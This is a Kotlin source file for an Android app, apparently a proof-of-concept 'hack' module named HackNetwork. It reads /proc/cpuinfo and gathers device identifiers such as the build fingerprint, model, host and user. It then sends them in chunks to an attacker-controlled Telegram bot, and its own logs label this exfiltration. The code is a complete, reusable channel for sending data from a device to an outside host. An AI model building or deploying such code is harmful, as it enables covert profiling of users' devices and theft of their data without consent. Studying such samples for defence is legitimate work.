package cocomelonc.hackcpu

import android.util.Log
import android.content.Context
import android.os.Build
import android.widget.Toast
import okhttp3.Call
import okhttp3.Callback
import okhttp3.FormBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException

import java.io.File
import java.io.BufferedReader
import java.io.InputStreamReader

class HackNetwork(private val context: Context) {

    private val client = OkHttpClient()
    private val tgLimit = 4000

    // Function to send message using OkHttp
    fun sendTextMessage(message: String) {
        val token = getTokenFromAssets()
        val chatId = getChatIdFromAssets()
        val deviceInfo = getDeviceName()
        val meow = "Meow! ♥\uFE0F"
        val messageToSend = "$message\n\n$deviceInfo\n\n$meow\n\n"

        val requestBody = FormBody.Builder()
            .add("chat_id", chatId)
            .add("text", messageToSend)
            .build()

        val request = Request.Builder()
            .url("https://api.telegram.org/bot$token/sendMessage")
            .post(requestBody)
            .build()

        // Send the request asynchronously using OkHttp
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                e.printStackTrace()
            }

            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    // Handle success
                    println("Message sent successfully: ${response.body?.string()}")
                } else {
                    println("Error: ${response.body?.string()}")
                }
            }
        })
    }

    // reads cpuinfo and sends it in chunks
    fun logcpuinfo() {
        val cpuinfo = File("/proc/cpuinfo")
        val TAG = "HACK"

        if (!cpuinfo.exists()) {
            sendTextMessage("[-] /proc/cpuinfo not found")
            return
        }

        try {
            // read the whole file content
            val fullContent = cpuinfo.readText()
            val dataToSend = fullContent + "\nmeow =^..^="

            // split into chunks if length exceeds limit
            if (dataToSend.length <= tgLimit) {
                sendTextMessage(dataToSend)
            } else {
                var start = 0
                while (start < dataToSend.length) {
                    val end = minOf(start + tgLimit, dataToSend.length)
                    val chunk = dataToSend.substring(start, end)

                    // send current chunk
                    sendTextMessage(chunk)
                    start += tgLimit

                    // small delay to prevent telegram rate limiting (429)
                    Thread.sleep(500)
                }
            }
            Log.i(TAG, "[+] exfiltration to telegram complete. meow =^..^=")

        } catch (e: Exception) {
            Log.e(TAG, "[x] error during exfiltration: ${e.message}")
            sendTextMessage("[x] error reading cpuinfo: ${e.message}")
        }


        try {
            // use foreach to process the file line by line efficiently
            cpuinfo.bufferedReader().useLines { lines ->
                lines.forEach { line ->
                    // we log every line to see the full hardware picture
                    Log.i(TAG, "[*] $line")
                }
            }
            Log.i(TAG, "[+] hardware profiling complete. meow =^..^=")
        } catch (e: Exception) {
            Log.i(TAG, "[x] error reading cpuinfo: ${e.message}")
        }
    }


    // Get device info
    private fun getDeviceName(): String {
        fun capitalize(s: String?): String {
            if (s.isNullOrEmpty()) {
                return ""
            }
            val first = s[0]
            return if (Character.isUpperCase(first)) {
                s
            } else {
                first.uppercaseChar().toString() + s.substring(1)
            }
        }

        val manufacturer = Build.MANUFACTURER
        val model = Build.MODEL
        val device = Build.DEVICE
        val deviceID = Build.ID
        val brand = Build.BRAND
        val hardware = Build.HARDWARE
        val hostInfo = Build.HOST
        val userInfo = Build.USER
        val board = Build.BOARD
        val display = Build.DISPLAY
        val fingerprint = Build.FINGERPRINT
        val devT = Build.TYPE
        val radio = Build.getRadioVersion()

        val info = "Hardware: ${capitalize(hardware)}\n" +
                "Manufacturer: ${capitalize(manufacturer)}\n" +
                "Model: ${capitalize(model)}\n" +
                "Device: ${capitalize(device)}\n" +
                "ID: ${capitalize(deviceID)}\n" +
                "Brand: ${capitalize(brand)}\n" +
                "Host: ${capitalize(hostInfo)}\n" +
                "User: ${capitalize(userInfo)}\n" +
                "Board: ${capitalize(board)}\n" +
                "Display: ${capitalize(display)}\n" +
                "Fingerprint: ${capitalize(fingerprint)}\n" +
                "Build TYPE: ${capitalize(devT)}\n" +
                "RADIO: ${capitalize(radio)}"

        return info
    }

    // Fetch token and chatId from assets (assuming these are saved in files)
    private fun getTokenFromAssets(): String {
        return context.assets.open("token.txt").bufferedReader().readText().trim()
    }

    private fun getChatIdFromAssets(): String {
        return context.assets.open("id.txt").bufferedReader().readText().trim()
    }
}